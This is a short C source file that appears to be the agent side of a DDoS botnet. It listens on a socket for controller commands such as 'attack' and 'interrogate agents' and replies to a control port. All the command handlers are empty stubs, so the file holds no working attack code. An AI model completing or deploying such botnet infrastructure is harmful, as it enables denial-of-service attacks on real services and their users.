#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "net_sockets.h"
#include "ddos.h"



int main(void)
{
    int sock;
    ddos_request_t req;
    ddos_responce_t resp;
    ddos_cmd_t cmd;
    attack_data_t attack_data = {};

    char ip[16];

    sock = create_socket(DDOS_AGENT_SRV_PORT, 0); 


    while (1)
    {
        memset(&req, 0, sizeof(ddos_request_t));
        memset(&resp, 0, sizeof(ddos_responce_t));

        recv_data(sock, &req, sizeof(ddos_request_t), ip); 

        cmd = ntohs(req.cmd);
        switch (cmd)
        {
            case DDOS_CMD_INTERROGATE_AGENTS:
                break;
            case DDOS_CMD_ATTACK:
                break;
            default:
                break;
        }

        send_data(sock, &resp, sizeof(ddos_responce_t), ip, DDOS_CTRL_CLT_PORT);
    }

    destroy_socket(sock);
    return 0;
}

